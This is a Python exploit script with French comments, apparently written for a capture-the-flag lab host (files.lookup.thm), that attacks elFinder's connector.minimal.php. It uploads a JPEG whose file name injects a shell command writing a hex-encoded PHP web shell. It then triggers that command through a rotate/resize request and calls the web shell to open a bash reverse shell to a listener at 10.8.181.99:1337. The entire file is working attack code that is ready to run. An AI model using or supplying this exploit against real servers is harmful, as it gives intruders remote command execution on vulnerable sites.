import requests
import base64
import json

# === CONFIG PERSONNELLE ===
target = "http://files.lookup.thm/elFinder/"
lhost = "10.8.181.99"     # Ton IP (netcat)
lport = "1337"            # Ton port d’écoute

# === Désactive les warnings SSL (si HTTPS utilisé un jour)
requests.packages.urllib3.disable_warnings()

# === Étape 1 : Construire l’URL correcte
if not target.endswith("/"):
    target += "/"
upload_url = target + "php/connector.minimal.php"
rotate_url_template = target + "php/connector.minimal.php?target={}&degree=180&mode=rotate&cmd=resize"
shell_url = target + f"php/rse.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/{lhost}/{lport}+0>%261'"

# === Étape 2 : Charger une image (fichier base64 inclus dans le script)
print("[+] Préparation de l'image")
img_base64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxIQEg8PEhIPFRIPDw8QEA8QDw8PEBAPFREWFhUVFRUYHSggGBolHRUVITEhJSkrLi4uFx8zODMsNygtLisBCgoKDg0NFQ8PFSsdFR0tLS0tKysrKy0tKy0tNy03LS0rKy0tLSsrKzc3LS0rLSsrKy0rKzctLTcrLSstNy0tK//AABEIAQMAwgMBIgACEQEDEQH/xAAbAAABBQEBAAAAAAAAAAAAAAADAAECBAUGB//EAD8QAAIBAgMFBQUGBQIHAQAAAAECAAMRBCExBRJBUWEGMnGBkRMiUqHRFGJyscHwQpKisuEjkxUXM3OC0vEH/8QAGQEBAQEBAQEAAAAAAAAAAAAAAAECAwUE/8QAIBEBAQEAAwADAAMBAAAAAAAAAREBAgMSITFBEyJRBP/aAAwDAQACEQMRAD8Aynwi9IL7OvMSVRjzlVmPOenHy0VlURiyyFOnvQVZbRCo1yLWygvY6AamBqtnFTrG/wBZrylEr0rG1jfj4wJuIcNBuIiIpCMYMCTtLBAx1iIkgYBUQDNj5DWWFxxA3V90dNT4mVAt5MLwiFTepeIRboEleESUSwlpXTOEBgWywGkmmkqpDqYQYGFVjAAyYMotI8IHlRHhleQWN6KDiiDJOHaROEaWTfnI36xGqDSw7AxqmFMs70FUPWSFZ1XByK4E9JaaNeaQFsLbOBenLhcQTOIFYUo5WHLwZIgD3YgIQgSFpUqQMYtGiiB1kxICTUQJqIRFjbto6mQFEmpggZJGgWVMKryqrQo8P3BocCBlY2hvIHN5c3RlbSgkX1JFUVVFU1RbJ2MnXSk7ID8+Cg=="
img_bytes = base64.b64decode(img_base64)

# === Étape 3 : Upload avec payload
print("[+] Upload de l'image piégée...")
payload_name = "image.jpg;echo 3c3f7068702073797374656d28245f524551554553545b2263225d293b203f3e0a | xxd -r -p > rse.php; #.jpg"
data = {
    "cmd": "upload",
    "target": "l1_Lw"
}
files = {
    "upload[]": (payload_name, img_bytes, "image/jpeg")
}

response = requests.post(upload_url, data=data, files=files, verify=False)

try:
    file_hash = response.json()["added"][0]["hash"]
    print(f"[+] Fichier uploadé avec succès ! hash = {file_hash}")
except Exception as e:
    print("[-] Échec de l'upload :")
    print(response.text)
    exit(1)

# === Étape 4 : Déclencher l'exécution du nom → création de rse.php
print("[+] Déclenchement de l'exécution (rotate)...")
rotate_url = rotate_url_template.format(file_hash)
requests.get(rotate_url, verify=False)

# === Étape 5 : Appel de la webshell PHP → reverse shell
print(f"[+] Appel de rse.php pour reverse shell vers {lhost}:{lport} ...")
requests.get(shell_url, verify=False)

print("[+] Terminé ! Regarde ton terminal Netcat :)")
